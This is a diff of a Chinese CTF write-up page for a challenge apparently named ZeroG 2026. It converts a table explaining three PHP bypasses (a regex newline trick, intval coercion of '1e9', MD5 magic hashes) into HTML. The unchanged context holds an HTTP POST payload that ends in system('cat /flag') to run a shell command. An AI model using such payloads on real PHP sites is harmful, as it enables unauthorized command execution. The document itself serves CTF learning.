@@ -306,10 +306,25 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /?zero=ZeroG%202026!%0A&amp;xp=1e9 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Welcome[_ctf.2026=240610708&amp;Welcome[_ctf_2026=240610708&amp;mm=QNKCDZO&amp;code=system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>一共三关</p>
-<p>| 1    | <code>zero=ZeroG%202026!%0A</code>                      | PCRE 的 <code>$</code>（无 <code>D</code> 修饰符）匹配<strong>结尾换行之前</strong>的位置，所以 <code>&quot;ZeroG 2026!\n&quot;</code> 能被正则命中，但 <code>!== &#39;ZeroG 2026!&#39;</code> 成立（多了一个 <code>\n</code>） |
-| —- | ——————————————– | ———————————————————— |
-| 2    | <code>xp=1e9</code>                                     | <code>intval(&quot;1e9&quot;)</code> 只取整数前缀 &#x3D; <code>1</code>（&lt; 2026），而 <code>&quot;1e9&quot; + 4</code> 按科学计数法算 &#x3D; <code>1000000004</code>（&gt; 2030） |
-| 3    | <code>Welcome[_ctf.2026=240610708</code> + <code>mm=QNKCDZO</code> | MD5 魔术哈希，两个 <code>0e</code> 纯数字串松散比较相等；<code>$a !== $b</code> 成立因为明文不同 |</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th><code>zero=ZeroG%202026!%0A</code></th>
+<th>PCRE 的 <code>$</code>（无 <code>D</code> 修饰符）匹配<strong>结尾换行之前</strong>的位置，所以 <code>&quot;ZeroG 2026!\n&quot;</code> 能被正则命中，但 <code>!== &#39;ZeroG 2026!&#39;</code> 成立（多了一个 <code>\n</code>）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td><code>xp=1e9</code></td>
+<td><code>intval(&quot;1e9&quot;)</code> 只取整数前缀 &#x3D; <code>1</code>（&lt; 2026），而 <code>&quot;1e9&quot; + 4</code> 按科学计数法算 &#x3D; <code>1000000004</code>（&gt; 2030）</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>Welcome[_ctf.2026=240610708</code> + <code>mm=QNKCDZO</code></td>
+<td>MD5 魔术哈希，两个 <code>0e</code> 纯数字串松散比较相等；<code>$a !== $b</code> 成立因为明文不同</td>
+</tr>
+</tbody></table>
 <p>印象里比较深的就是 [ 会被解析为[ 然后什么会被解析成.我忘了，等题目复现了，和本地复现情况不太一样</p>
 <p>大致和极客大挑战的大差不差。</p>
 <h4 id="Stage2一史迪仔的文件预览器"><a href="#Stage2一史迪仔的文件预览器" class="headerlink" title="Stage2一史迪仔的文件预览器"></a>Stage2一史迪仔的文件预览器</h4><p><img src="/images/zerog-2026-wp/image-20261030210200319.png" alt="image-20261030210200319"></p>
